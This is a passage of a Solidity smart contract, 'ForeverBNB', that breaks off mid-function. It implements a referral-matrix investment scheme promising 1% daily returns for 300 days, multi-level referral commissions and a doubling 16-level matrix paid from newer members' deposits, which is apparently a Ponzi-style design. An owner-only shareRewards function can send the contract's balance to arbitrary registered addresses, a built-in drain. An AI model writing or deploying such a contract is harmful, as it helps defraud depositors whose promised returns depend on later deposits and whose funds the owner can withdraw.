// SPDX-License-Identifier: MIT
pragma solidity 0.7.4;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
    
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        return a % b;
    }
}


contract ForeverBNB {
    
    struct UserStruct {
        bool isExist;
        uint id;
        address referrer;
        uint partnersCount;
        uint totalDeposit;
        mapping (uint8 => MatrixStruct) matrixIncome;
        uint8 matrixCurrentLevel;
    }
    
    struct DividendStruct{
        bool isExist;
        address userAddress;
        uint uniqueId;
        uint investAmount;
        uint startROITime;
        uint lastRefreshTime;
        uint endROITime;
        bool completed;
        uint reInvestCount;
        bool levelIncomeEligible; 
        uint referrerID; 
        mapping (uint8 => uint[]) lineRef; 
    } 
    
    struct StakingStruct{
        bool isExist;
        address userAddress;
        uint uniqueId;
        uint referrerID;
        mapping (uint8 => uint[]) lineRef;
        mapping (uint8 => uint) lineDeposit;
        mapping (uint8 => bool) lineStatus;
        uint[] investAmount;
        uint[] startROITime;
        uint[] lastRefreshTime;
        uint[] endROITime;
        bool[] completed;
    }
    
    struct MatrixStruct{
        address userAddress;
        uint uniqueId;
        uint referrerID;
        uint[] firstLineRef;
        uint[] secondLineRef;
        bool levelStatus;
        uint reInvestCount;
    }
    
    using SafeMath for uint;
    bool public lockStatus;
    uint8 public constant LAST_LEVEL = 16;
    uint public constant DAY_LENGTH_IN_SECONDS = 1 days;
    address public ownerAddress; 
    uint public totalContractDeposit;
    uint public userCurrentId = 1;
    uint public divPlanInvest = 0.05 * (10 ** 18);
    uint public stakingMinInvest = 0.25 * (10 ** 18);
    uint public levelIncomeShare = 15 * (10 ** 18); 
    
    uint[2] public roiDuration = [300 days, 200 days]; // Duration  --  0 - Dividend_Duration  1- Staking_Duration
    uint[2] public roiPercentage = [1 * (10 ** 18), 1 * (10 ** 18)]; // per day %  --  0 - Dividend_ROI  1- Staking_ROI
    uint[5] public stakingRefLinePercentage = [5 * (10 ** 18), 3 * (10 ** 18), 2 * (10 ** 18), 0.5 * (10 ** 18), 0.5 * (10 ** 18)];
   
    mapping (address => UserStruct) public users;
    mapping (address => DividendStruct) public dividendIncome;
    mapping (address => StakingStruct) public stakingUsers;
    mapping (uint => address) public userList;
    mapping (uint8 => uint) public matrixLevelPrice;
    mapping (address => uint) public divLoopCheck;
    mapping (uint8 => uint) public stakingLineLimit;
    mapping (address => mapping (uint8 => mapping (uint8 => uint))) public earnedBNB;
    mapping (address => mapping (uint8 => mapping (uint8 => uint))) public availBal; //2 ReInvest 1 Upgrade 3 ROI
    mapping (address => mapping (uint8 => uint)) public totalEarbedBNB; 
    mapping (address => mapping (uint8 => uint)) public availROI;
    
    
    modifier onlyOwner() {
        require(msg.sender == ownerAddress, "Only Owner");
        _;
    }
      
    modifier isLock() {
        require(lockStatus == false, "Contract Locked");
        _;
    } 
    
    event AdminTransactionEvent(uint8 indexed flag, uint amount, uint time);
    event DivPlanDepositEvent(address indexed userAddress, uint amount, uint time);
    event LevelIncomeEarningsEvent(address indexed receiverAddress, address indexed callerAddress, uint amount, uint time);
    event StakingPlanDepositEvent(address indexed userAddress, uint amount, uint time);
    event StakingRefShareEvent(address indexed userAddress, address callerAddress, uint stakingLimit,  uint shareAmount, uint time);
    event UserWithdrawEvent(uint8 flag, address indexed userAddress, uint withdrawnAmount, uint time);
    event ShareRewardsEvent(address indexed userAddress, uint rewardAmount, uint time);
    event MatrixRegEvent(address indexed userAddress, address indexed referrerAddress, uint time);
    event MatrixBuyEvent(address indexed userAddress, address indexed referrerAddress, uint8 levelNo, uint time);
    event MatrixGetMoneyEvent(address indexed userAddress,uint userId, address indexed referrerAddress, uint referrerId, uint8 levelNo, uint levelPrice, uint time);
    event MatrixLostMoneyEvent(address indexed userAddress,uint userId, address indexed referrerAddress, uint referrerId, uint8 levelNo, uint levelPrice, uint time);
    event MatrixReInvestEvent(address indexed userAddress,address indexed callerAddress, uint8 levelNo, uint reInvestCount, uint time); 

    constructor()  {
        ownerAddress = msg.sender;
        
        // matrixLevelPrice
        matrixLevelPrice[0] = 0.025 * (10 ** 18); 
        
        stakingLineLimit[1] = 1500 * (10 ** 18);  
        stakingLineLimit[2] = 5000 * (10 ** 18);   
        stakingLineLimit[3] = 10000 * (10 ** 18);
        stakingLineLimit[4] = 20000 * (10 ** 18); 
       
        users[ownerAddress].isExist = true;
        users[ownerAddress].id = userCurrentId;
        users[ownerAddress].referrer = address(0);
        users[ownerAddress].matrixCurrentLevel = LAST_LEVEL; 
        
        userList[1] = ownerAddress;
        stakingUsers[ownerAddress].isExist = true;
        stakingUsers[ownerAddress].userAddress = ownerAddress; 
        stakingUsers[ownerAddress].uniqueId = users[ownerAddress].id; 
        
        dividendIncome[ownerAddress].isExist = true;
        dividendIncome[ownerAddress].userAddress = ownerAddress;
        dividendIncome[ownerAddress].uniqueId = users[ownerAddress].id;
        
        dividendIncome[ownerAddress].levelIncomeEligible = true; 
        
        for(uint8 i = 1; i <= LAST_LEVEL; i++) {
            matrixLevelPrice[i] = matrixLevelPrice[i-1].mul(2); 
            users[ownerAddress].matrixIncome[i].userAddress = ownerAddress;
            users[ownerAddress].matrixIncome[i].uniqueId = userCurrentId;
            users[ownerAddress].matrixIncome[i].levelStatus = true;
        }
        
    } 
   
    
    receive() external payable {
        revert("Invalid Transaction");
        
    }
    
    function adminBNBDeposit() external onlyOwner payable {
        emit AdminTransactionEvent(1, msg.value, block.timestamp);
    } 
    
    function shareRewards(address[5] calldata _users, uint[5] calldata _amount) external onlyOwner {
        for(uint i=0; i< _users.length ; i++) {
            require(users[_users[i]].isExist == true, "User Not Exist");
            require(_sendBNB(_users[i], _amount[i]), "Insufficient Contract Balance - Rewards Sharing");
            emit ShareRewardsEvent( _users[i], _amount[i], block.timestamp);
        }
    }
    
    function shareLevelIncome(address _userAddress,  uint _shareAmount)  internal { //_shareAmount = 0.5 * (10 ** 18) * 1%
        address ref = users[_userAddress].referrer;
        
        divLoopCheck[msg.sender] = divLoopCheck[msg.sender].add(1); 
    
        if(divLoopCheck[msg.sender] == 1) {
             
            if((block.timestamp < dividendIncome[ref].endROITime || ref == ownerAddress) && dividendIncome[ref].lineRef[1].length >= 1)   {
                require(_sendBNB(ref, _shareAmount), "Div Level Income Sharing Failed 1");
                emit LevelIncomeEarningsEvent(ref, msg.sender, _shareAmount, block.timestamp);
            }
            
            shareLevelIncome(ref, _shareAmount);
            
        }
      
      
       else if(divLoopCheck[msg.sender] > 1 && divLoopCheck[msg.sender] <= 10) {
                
            if((block.timestamp < dividendIncome[ref].endROITime || ref == ownerAddress) )   {
                 if(dividendIncome[ref].lineRef[1].length >= 10 ){
                     require(_sendBNB(ref, _shareAmount), "Div Level Income Sharing Failed 2");
                     emit LevelIncomeEarningsEvent(ref, msg.sender, _shareAmount, block.timestamp);
                 }
            }
               
            shareLevelIncome(ref, _shareAmount);
       }
       
        
    } 
    
    function registration(uint _referrerID) external isLock payable{
        require(users[msg.sender].isExist == false, "User Exist");
        require(_referrerID>0 && _referrerID <= userCurrentId,"Incorrect Referrer Id");
        require(msg.value == matrixLevelPrice[1].add(divPlanInvest),"Incorrect Value");
        
        // check 
        address userAddress=msg.sender;
        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }
        require(size == 0, "cannot be a contract");
        
        
        UserStruct storage userData = users[msg.sender];
        userCurrentId = userCurrentId.add(1);
        userData.isExist= true;
        userData.id = userCurrentId;
        userData.referrer = userList[_referrerID];
        userData.totalDeposit = msg.value;
        userData.matrixCurrentLevel = 1;
        userList[userCurrentId] = msg.sender;
        users[userList[_referrerID]].partnersCount = users[userList[_referrerID]].partnersCount.add(1);
        totalContractDeposit = totalContractDeposit.add(msg.value);
        _dividendPlan(msg.sender, msg.value.div(2));
        _matrixRegistration(_referrerID);
    } 
    
    function _reInvestDividendPlan() external isLock payable {
        require(users[msg.sender].isExist == true, "User Not Exist");
        require(msg.value == divPlanInvest, "Invalid Amount");
        availableDividends(msg.sender);
         
        _dividendPlan(msg.sender, msg.value);
        users[msg.sender].totalDeposit = users[msg.sender].totalDeposit.add(msg.value);
        totalContractDeposit = totalContractDeposit.add(msg.value);
    }
    
    function _stakingRefUpdate(address _referrerAddress, uint8 _flag) internal {
        
        if(_referrerAddress != address(0) &&  stakingUsers[_referrerAddress].isExist == true)  
            stakingUsers[_referrerAddress].lineRef[_flag].push(users[msg.sender].id);
    }
    
    function _stakingRefShare(address _referrerAddress, uint8 _flag, uint _amount) internal {
        if(_referrerAddress != address(0) &&  stakingUsers[_referrerAddress].isExist == true) {
           
            stakingUsers[_referrerAddress].lineDeposit[_flag] = stakingUsers[_referrerAddress].lineDeposit[_flag].add(_amount);
            
            if((stakingUsers[_referrerAddress].lineDeposit[_flag] >= stakingLineLimit[_flag] && stakingUsers[_referrerAddress].lineStatus[_flag] == false) || _flag == 0) {
                
                uint _share;
                if(_flag != 0)
                    _share = ((stakingLineLimit[_flag]).mul(stakingRefLinePercentage[_flag])).div(100 * (10 ** 18));
                    
                else if(_flag == 0)
                    _share = ((_amount).mul(stakingRefLinePercentage[_flag])).div(100 * (10 ** 18)); 
                
                stakingUsers[_referrerAddress].lineStatus[_flag]  =  true;
                require(_sendBNB(_referrerAddress, _share), "Compound Level Income Sharing Failed");
                emit StakingRefShareEvent(_referrerAddress, msg.sender, stakingLineLimit[_flag], _share, block.timestamp);
            }
        }
        
    }
    
    function updateStaking(address userAddress,uint256 amount) internal { 
        stakingUsers[userAddress].investAmount.push(amount);
        stakingUsers[userAddress].startROITime.push(block.timestamp);
        stakingUsers[userAddress].lastRefreshTime.push(block.timestamp);
        stakingUsers[userAddress].endROITime.push(block.timestamp.add(roiDuration[1]));
        stakingUsers[userAddress].completed.push(false); 
        
        emit StakingPlanDepositEvent(userAddress, amount, block.timestamp);
    }
    
    function depositStaking() external isLock payable {
        require(msg.value >= stakingMinInvest, "Invalid Staking Amount");
        address[5] memory _referrerAddress;
        
        _referrerAddress[0] = users[msg.sender].referrer;
        _referrerAddress[1] = users[_referrerAddress[0]].referrer;
        _referrerAddress[2] = users[_referrerAddress[1]].referrer;
        _referrerAddress[3] = users[_referrerAddress[2]].referrer;
        _referrerAddress[4] = users[_referrerAddress[3]].referrer;
       
        require(users[msg.sender].isExist == true && users[_referrerAddress[0]].isExist == true, "Not In System");
        
        if(stakingUsers[msg.sender].isExist == false) {
            stakingUsers[msg.sender].isExist = true;
            stakingUsers[msg.sender].userAddress = msg.sender;
            stakingUsers[msg.sender].uniqueId =  users[msg.sender].id;
            stakingUsers[msg.sender].referrerID = users[_referrerAddress[0]].id; 
            
            _stakingRefUpdate(_referrerAddress[0], 0);
            _stakingRefUpdate(_referrerAddress[1], 1);
            _stakingRefUpdate(_referrerAddress[2], 2);
            _stakingRefUpdate(_referrerAddress[3], 3);
            _stakingRefUpdate(_referrerAddress[4], 4);
        }
        
        updateStaking(msg.sender,msg.value); 
        users[msg.sender].totalDeposit = users[msg.sender].totalDeposit.add(msg.value);
        totalContractDeposit = totalContractDeposit.add(msg.value); 
        
        _stakingRefShare(_referrerAddress[0], 0, msg.value);
        _stakingRefShare(_referrerAddress[1], 1, msg.value);
        _stakingRefShare(_referrerAddress[2], 2, msg.value);
        _stakingRefShare(_referrerAddress[3], 3, msg.value);
        _stakingRefShare(_referrerAddress[4], 4, msg.value);
        
    }
    
    function userStakingWithdraw(uint wAmount) external isLock {
        uint _withdrawAmount = _directRoi(msg.sender);
        require(_withdrawAmount >= wAmount, "Insufficient ROI"); 
        availROI[msg.sender][2] = availROI[msg.sender][2].sub(wAmount);
        totalEarbedBNB[msg.sender][2] = totalEarbedBNB[msg.sender][2].add(wAmount);
        require((msg.sender).send(wAmount),"Withdraw failed");
        emit UserWithdrawEvent(2, msg.sender, wAmount, block.timestamp);
    } 
    
    function viewLineIncomeReferrals(address _userAddress, uint8 _line) external view returns(uint[] memory) {
        return dividendIncome[_userAddress].lineRef[_line];
    }
    
    function viewStakingRefDetails(address _userAddress, uint8 _line) external view returns(uint[] memory, uint, bool) {
        return (stakingUsers[_userAddress].lineRef[_line], stakingUsers[_userAddress].lineDeposit[_line], stakingUsers[_userAddress].lineStatus[_line]);
    }
    
    function viewMatrixDetails(address _userAddress, uint8 _level) external view returns(uint uniqueId, uint referrerID, uint[] memory firstLineRef, uint[] memory secondLineRef,
                                                                    bool levelStatus, uint reInvestCount) {
        return (users[_userAddress].matrixIncome[_level].uniqueId,
                users[_userAddress].matrixIncome[_level].referrerID,
                users[_userAddress].matrixIncome[_level].firstLineRef,
                users[_userAddress].matrixIncome[_level].secondLineRef,
                users[_userAddress].matrixIncome[_level].levelStatus,
                users[_userAddress].matrixIncome[_level].reInvestCount);
    }
    
    function viewStakingDetails(address _userAddress) external view returns(uint[] memory, uint [] memory, uint[] memory, uint[] memory, bool [] memory) {
        return (stakingUsers[_userAddress].investAmount,
                stakingUsers[_userAddress].startROITime,
                stakingUsers[_userAddress].lastRefreshTime,
                stakingUsers[_userAddress].endROITime,
                stakingUsers[_userAddress].completed);
    }
    
    function _dividendPlan(address _investor, uint _amount) internal {
        
        if(dividendIncome[_investor].isExist == false) {
            dividendIncome[_investor].isExist = true;
            dividendIncome[_investor].userAddress = msg.sender;
            dividendIncome[_investor].uniqueId = users[msg.sender].id;
            dividendIncome[_investor].referrerID = users[users[msg.sender].referrer].id;
            _levelPlan(_investor);
        }
        else {
            require(block.timestamp >= dividendIncome[msg.sender].endROITime || dividendIncome[_investor].completed == true, "Already Active");
            dividendIncome[_investor].completed = false;
            dividendIncome[_investor].reInvestCount = dividendIncome[_investor].reInvestCount.add(1); 
        }
        
        dividendIncome[_investor].investAmount =  _amount;
        dividendIncome[_investor].startROITime = block.timestamp;
        dividendIncome[_investor].lastRefreshTime = block.timestamp;
        dividendIncome[_investor].endROITime = block.timestamp.add(roiDuration[0]);
        dividendIncome[_investor].levelIncomeEligible = true;
        emit DivPlanDepositEvent(msg.sender, _amount, block.timestamp);
    }
    
    function _levelPlan(address _userAddress) internal {
        
        for(uint8 i=1; i<=10; i++) {
            address _ref = users[_userAddress].referrer;
            if(_ref != address(0)) {
                dividendIncome[_ref].lineRef[i].push(users[msg.sender].id);
                _userAddress = _ref;
            }
            else {
                break;
            }
        }
    }
    
    function userDividendWithdraw(uint _wAmount) external isLock {
        uint _withdrawAmount = availableDividends(msg.sender);
        require(_withdrawAmount >= _wAmount, "Insufficient Withdraw Amount");
        
        divLoopCheck[msg.sender] = 0;
        shareLevelIncome(msg.sender, (_wAmount.mul(levelIncomeShare).div(100 * (10 ** 18))));
        
        if(block.timestamp >= dividendIncome[msg.sender].endROITime) {
            dividendIncome[msg.sender].lastRefreshTime = dividendIncome[msg.sender].endROITime; 
            dividendIncome[msg.sender].completed = true;
            dividendIncome[msg.sender].levelIncomeEligible = false;
        }
     
        availROI[msg.sender][1] = availROI[msg.sender][1].sub(_wAmount);
        totalEarbedBNB[msg.sender][1] = totalEarbedBNB[msg.sender][1].add(_wAmount);
        require(address(uint160(msg.sender)).send(_wAmount),"Withdraw Transaction Failed");
        emit UserWithdrawEvent(1, msg.sender, _wAmount, block.timestamp);
       
    } 
    
    
    function availableDividends(address _userAddress) internal  returns(uint) {
        uint withdrawAmount = 0;
        uint nowOrEndOfProfit = 0;
            
        if(block.timestamp <  dividendIncome[_userAddress].endROITime)
            nowOrEndOfProfit = block.timestamp;
        
        else if (block.timestamp >= dividendIncome[_userAddress].endROITime) 
            nowOrEndOfProfit = dividendIncome[_userAddress].endROITime;
        
        uint timeSpent = nowOrEndOfProfit.sub(dividendIncome[_userAddress].lastRefreshTime);
            
        if(timeSpent >= DAY_LENGTH_IN_SECONDS) {
            uint noD = timeSpent.div(DAY_LENGTH_IN_SECONDS);
            uint perDayShare = dividendIncome[_userAddress].investAmount.mul(roiPercentage[0]).div(100 * (10 ** 18));
            withdrawAmount = perDayShare.mul(noD);
            dividendIncome[_userAddress].lastRefreshTime = dividendIncome[_userAddress].lastRefreshTime.add(noD.mul(DAY_LENGTH_IN_SECONDS)); 
        }
        
        availROI[_userAddress][1] = availROI[_userAddress][1].add(withdrawAmount);
        return availROI[_userAddress][1];
     
    } 
    
    function userAvailableDividends(address _userAddress) public view returns(uint) {
        uint withdrawAmount = 0;
        uint nowOrEndOfProfit = 0;
            
        if(block.timestamp <  dividendIncome[_userAddress].endROITime)
            nowOrEndOfProfit = block.timestamp;
        
        else if (block.timestamp >= dividendIncome[_userAddress].endROITime) 
            nowOrEndOfProfit = dividendIncome[_userAddress].endROITime;
        
        uint timeSpent = nowOrEndOfProfit.sub(dividendIncome[_userAddress].lastRefreshTime);
            
        if(timeSpent >= DAY_LENGTH_IN_SECONDS) {
            uint noD = timeSpent.div(DAY_LENGTH_IN_SECONDS);
            uint perDayShare = dividendIncome[_userAddress].investAmount.mul(roiPercentage[0]).div(100 * (10 ** 18));
            withdrawAmount = perDayShare.mul(noD);
        }
        
        return withdrawAmount.add(availROI[_userAddress][1]);
     
    } 
    
    function _matrixRegistration(uint _referrerID) internal {
        uint firstLineId;
        uint secondLineId;
        
        if(users[userList[_referrerID]].matrixIncome[1].firstLineRef.length < 3) {
            firstLineId = _referrerID;
            secondLineId = users[userList[firstLineId]].matrixIncome[1].referrerID;
        }
        
        else if(users[userList[_referrerID]].matrixIncome[1].secondLineRef.length < 9) {
            (secondLineId,firstLineId) = _findMatrixReferrer(1,_referrerID);
        }
        
        
        MatrixStruct memory matrixUserDetails;
        
        matrixUserDetails = MatrixStruct({
            userAddress: msg.sender,
            uniqueId: userCurrentId,
            referrerID: firstLineId,
            firstLineRef: new uint[](0),
            secondLineRef: new uint[](0),
            levelStatus: true,
            reInvestCount:0
        });
        
        users[msg.sender].matrixIncome[1] = matrixUserDetails;
      
        users[userList[firstLineId]].matrixIncome[1].firstLineRef.push(userCurrentId);
        
        if(secondLineId != 0) 
            users[userList[secondLineId]].matrixIncome[1].secondLineRef.push(userCurrentId);
        
        _updateMatrixDetails(secondLineId,msg.sender,1);
        emit MatrixRegEvent(msg.sender, userList[firstLineId], block.timestamp);
    } 
    
    function _updateMatrixDetails(uint secondLineId, address _userAddress, uint8 _level) internal {
        
        if(secondLineId == 0)
            secondLineId = 1; 
            
        if(users[userList[secondLineId]].matrixIncome[_level].secondLineRef.length > 3) { // morethan 3
        
            if(users[userList[secondLineId]].matrixIncome[_level].secondLineRef.length == 4 || 
                users[userList[secondLineId]].matrixIncome[_level].secondLineRef.length == 5 ||
                users[userList[secondLineId]].matrixIncome[_level].secondLineRef.length == 6 || 
                users[userList[secondLineId]].matrixIncome[_level].secondLineRef.length == 7) { // upgrade 
                
                if(users[userList[secondLineId]].matrixIncome[_level+1].levelStatus == false) 
                    _payMatrixBNB(1, _level, _userAddress, matrixLevelPrice[_level]); // upgrade
                
                else if(users[userList[secondLineId]].matrixIncome[_level+1].levelStatus == true 
                    || _level == LAST_LEVEL) 
                    _payMatrixBNB(0, _level, _userAddress, matrixLevelPrice[_level]); // already active 
            } 
            
            else if(users[userList[secondLineId]].matrixIncome[_level].secondLineRef.length == 8 
                || users[userList[secondLineId]].matrixIncome[_level].secondLineRef.length == 9) { // 50%  for first upline and another 50% for reInvest
                
                _payMatrixBNB(2, _level, _userAddress, matrixLevelPrice[_level]);  // Hold  And ReInvest 
            }

        }
    
        else if(users[userList[secondLineId]].matrixIncome[_level].secondLineRef.length <= 3) // 50%  for first upline and another 50% second upline // lessthan 3
            _payMatrixBNB(0, _level, _userAddress, matrixLevelPrice[_level]);
        
        
    } 
    
    function _findMatrixReferrer(uint8 _level,  uint _refId) internal view returns(uint secondLineId, uint firstLineId) {
        
        if(users[userList[_refId]].matrixIncome[_level].firstLineRef.length <3)
            return(users[userList[_refId]].matrixIncome[_level].referrerID,_refId);
            
        else {
            
            uint[] memory referrals = new uint[](3);
            referrals[0] = users[userList[_refId]].matrixIncome[_level].firstLineRef[0];
            referrals[1] = users[userList[_refId]].matrixIncome[_level].firstLineRef[1];
            referrals[2] = users[userList[_refId]].matrixIncome[_level].firstLineRef[2];
            
            
            for (uint8 k=0; k<3; k++) {
                if(users[userList[_refId]].matrixIncome[_level].secondLineRef.length == 0+k ||
                users[userList[_refId]].matrixIncome[_level].secondLineRef.length == 3+k ||
                users[userList[_refId]].matrixIncome[_level].secondLineRef.length == 6+k) {
                    
                    if(users[userList[referrals[k]]].matrixIncome[_level].firstLineRef.length < 3) {
                        return (_refId, referrals[k]);
                    }
                }
            }
            
            for(uint8 r=0; r<3; r++) {
                if(users[userList[referrals[r]]].matrixIncome[_level].firstLineRef.length < 3) 
                     return (_refId, referrals[r]);
            }
            
        }
        
    }
    
    function _getMatrixReferrer(address _userAddress, uint8 _level) internal returns(uint refId) {
        while (true) {
            
            uint referrerID =  users[_userAddress].matrixIncome[1].referrerID;
            if (users[userList[referrerID]].matrixIncome[_level].levelStatus == true) {
                return referrerID;
            }
            
            _userAddress = userList[referrerID];
            emit MatrixLostMoneyEvent(msg.sender, users[msg.sender].id, userList[referrerID],referrerID, _level, matrixLevelPrice[_level].div(2), block.timestamp);
        }
        
    }
    
    function _matrixReInvest(address _reInvest,  uint8 _level) internal {
        uint userUniqueId = users[_reInvest].id;
        address _referrer = users[_reInvest].referrer; 
        
        uint firstLineId;
        uint secondLineId;
        
        if(users[_referrer].matrixIncome[_level].firstLineRef.length < 3) {
            firstLineId = users[_referrer].id;
            secondLineId = users[userList[firstLineId]].matrixIncome[_level].referrerID;
        }
        
        else if(users[_referrer].matrixIncome[_level].secondLineRef.length < 9) {
            (secondLineId,firstLineId) = _findMatrixReInvestReferrer(_level, users[_reInvest].id, users[_referrer].id);
        }
        
        users[_reInvest].matrixIncome[_level].userAddress = _reInvest;
        users[_reInvest].matrixIncome[_level].uniqueId = userUniqueId;
        users[_reInvest].matrixIncome[_level].referrerID = firstLineId;
        users[_reInvest].matrixIncome[_level].levelStatus = true; 
        
        users[_reInvest].matrixIncome[_level].secondLineRef = new uint[](0);
        users[_reInvest].matrixIncome[_level].firstLineRef = new uint[](0);
        users[_reInvest].matrixIncome[_level].reInvestCount =  users[_reInvest].matrixIncome[_level].reInvestCount.add(1);
      
        users[userList[firstLineId]].matrixIncome[_level].firstLineRef.push(userUniqueId);
        
        if(secondLineId != 0) 
            users[userList[secondLineId]].matrixIncome[_level].secondLineRef.push(userUniqueId);
        
         totalContractDeposit = totalContractDeposit.add(matrixLevelPrice[_level]);
        _updateMatrixDetails(secondLineId, _reInvest, _level); 
         emit MatrixReInvestEvent(_reInvest, msg.sender, _level, users[_reInvest].matrixIncome[_level].reInvestCount, block.timestamp); 
    }
    
    function _matrixBuyLevel(address _userAddress, uint8 _level) internal {
        
        uint firstLineId;
        uint secondLineId = _getMatrixReferrer(_userAddress,_level);
        
       if(users[userList[secondLineId]].matrixIncome[_level].firstLineRef.length < 3) {
            firstLineId = secondLineId;
            secondLineId = users[userList[firstLineId]].matrixIncome[_level].referrerID;
        }
        
        else if(users[userList[secondLineId]].matrixIncome[_level].secondLineRef.length < 9) {
            (secondLineId,firstLineId) = _findMatrixReferrer(_level,secondLineId);
        }
        
        MatrixStruct memory matrixUserDetails;
        
        matrixUserDetails = MatrixStruct({
            userAddress: _userAddress,
            uniqueId: users[_userAddress].id,
            referrerID: firstLineId,
            firstLineRef: new uint[](0),
            secondLineRef: new uint[](0),
            levelStatus: true,
            reInvestCount:0
        });
        
        users[_userAddress].matrixIncome[_level] = matrixUserDetails;
        users[_userAddress].matrixCurrentLevel  = _level;
        users[userList[firstLineId]].matrixIncome[_level].firstLineRef.push(users[_userAddress].id);
        
        if(secondLineId != 0) 
            users[userList[secondLineId]].matrixIncome[_level].secondLineRef.push(users[_userAddress].id);
            
        totalContractDeposit = totalContractDeposit.add(matrixLevelPrice[_level]);
        _updateMatrixDetails(secondLineId, _userAddress, _level);
        emit MatrixBuyEvent(_userAddress, userList[firstLineId], _level, block.timestamp);
    }
    
    function _sendBNB(address _user, uint _amount) internal returns(bool tStatus){
        tStatus = (address(uint160(_user))).send(_amount);
        return tStatus;
    }
    
    function _payMatrixBNB(uint8 _flag, uint8 _level, address _userAddress, uint256 _amt) internal {
        
        uint[3] memory referer;
        
        referer[0] = users[_userAddress].matrixIncome[_level].referrerID;
        referer[1] = users[userList[referer[0]]].matrixIncome[_level].referrerID;
        
        // first upline -------------------------
        
        if(users[userList[referer[0]]].matrixIncome[_level].levelStatus == false) 
            referer[0] = 1;
            
        totalEarbedBNB[userList[referer[0]]][3] = totalEarbedBNB[userList[referer[0]]][3].add(_amt.div(2));
        earnedBNB[userList[referer[0]]][1][_level] =  earnedBNB[userList[referer[0]]][1][_level].add(_amt.div(2)); 
         
         // second upline  -------------------------------
        
        if(_flag == 0) { // second upline - 50% 
         
            if(users[userList[referer[1]]].matrixIncome[_level].levelStatus == false) 
                referer[1] = 1;
                
            totalEarbedBNB[userList[referer[1]]][3] = totalEarbedBNB[userList[referer[1]]][3].add(_amt.div(2));
            earnedBNB[userList[referer[1]]][1][_level] =  earnedBNB[userList[referer[1]]][1][_level].add(_amt.div(2));
            require(_sendBNB(userList[referer[1]], _amt.div(2)), "Matrix Transaction Failure 0");
            emit MatrixGetMoneyEvent(msg.sender,users[msg.sender].id,userList[referer[1]],referer[1],_level,_amt.div(2),block.timestamp);
        }
        
        else if(_flag == 1)   { // upgrade 
        
            uint8 upgradeLevel = _level+1;
           
            availBal[userList[referer[1]]][upgradeLevel][_flag] = availBal[userList[referer[1]]][upgradeLevel][_flag].add(_amt.div(2));
            
            if(availBal[userList[referer[1]]][upgradeLevel][_flag] == matrixLevelPrice[upgradeLevel]) {
                 availBal[userList[referer[1]]][upgradeLevel][_flag] = 0;
                _matrixBuyLevel(userList[referer[1]], upgradeLevel);
            } 
           
        }
        
        else if(_flag == 2)   { // reInvest 
        
            availBal[userList[referer[1]]][_level][_flag] = availBal[userList[referer[1]]][_level][_flag].add(_amt.div(2));
            
            if(availBal[userList[referer[1]]][_level][_flag] == matrixLevelPrice[_level]) {
                 availBal[userList[referer[1]]][_level][_flag] = 0;
                if(userList[referer[1]] != ownerAddress) 
                    _matrixReInvest(userList[referer[1]],_level);
                    
                else if (userList[referer[1]] == ownerAddress) {
                    users[userList[referer[1]]].matrixIncome[_level].secondLineRef = new uint[](0);
                    users[userList[referer[1]]].matrixIncome[_level].firstLineRef = new uint[](0);
                    users[userList[referer[1]]].matrixIncome[_level].reInvestCount =  users[userList[referer[1]]].matrixIncome[_level].reInvestCount.add(1); 
                    emit MatrixReInvestEvent(userList[referer[1]], msg.sender, _level, users[userList[referer[1]]].matrixIncome[_level].reInvestCount, block.timestamp); 
                    
                    totalEarbedBNB[userList[referer[1]]][3] = totalEarbedBNB[userList[referer[1]]][3].add(_amt);
                    earnedBNB[userList[referer[1]]][1][_level] =  earnedBNB[userList[referer[1]]][1][_level].add(_amt);
                    require(_sendBNB(userList[referer[1]], _amt), "Matrix Transaction Failure 2");
                    emit MatrixGetMoneyEvent(msg.sender,users[msg.sender].id,userList[referer[1]],referer[1],_level,_amt,block.timestamp); 
                }
            }
        }
        
        require(_sendBNB(userList[referer[0]], _amt.div(2)), "Matrix Transaction Failure 1");
        emit MatrixGetMoneyEvent(msg.sender,users[msg.sender].id,userList[referer[0]],referer[0],_level,_amt.div(2),block.timestamp);
    }
    
    function _findMatrixReInvestReferrer(uint8 _level,uint _reInvestId, uint _refId) internal view returns(uint seconLineId, uint firstLineId) {
        
        if(users[userList[_refId]].matrixIncome[_level].firstLineRef.length <3)
            return(users[userList[_refId]].matrixIncome[_level].referrerID,_refId);
            
        else {
            
            uint[] memory referrals = new uint[](3);
            referrals[0] = users[userList[_refId]].matrixIncome[_level].firstLineRef[0];
            referrals[1] = users[userList[_refId]].matrixIncome[_level].firstLineRef[1];
            referrals[2] = users[userList[_refId]].matrixIncome[_level].firstLineRef[2];
            
            
            for (uint8 k=0; k<3; k++) {
                if(users[userList[_refId]].matrixIncome[_level].secondLineRef.length == 0+k ||
                users[userList[_refId]].matrixIncome[_level].secondLineRef.length == 3+k ||
                users[userList[_refId]].matrixIncome[_level].secondLineRef.length == 6+k) {
                    if(users[userList[referrals[k]]].matrixIncome[_level].firstLineRef.length < 3) {
                        if(referrals[k] != _reInvestId)
                            return (_refId, referrals[k]);
                    }
                }
            }
            
            for(uint8 r=0; r<3; r++) {
                if(users[userList[referrals[r]]].matrixIncome[_level].firstLineRef.length < 3) {
                    if(referrals[r] != _reInvestId)
                        return (_refId, referrals[r]);
                }
                
                if(users[userList[referrals[r]]].matrixIncome[_level].firstLineRef.length < 3) {
                        return (_refId, referrals[r]);
                }
            }
            
        }
        
    } 
    
    function availableStakingROI(address _userAddress) external view returns(uint) {
        uint8 i =0;
        uint[2] memory timeOrProfit;
             
        while (i < stakingUsers[_userAddress].investAmount.length) {
            if(stakingUsers[_userAddress].completed[i] == false){
                uint nowOrEndOfProfit = block.timestamp;
                
                if (block.timestamp > stakingUsers[_userAddress].endROITime[i]){
                    nowOrEndOfProfit = stakingUsers[_userAddress].endROITime[i];
                }
                
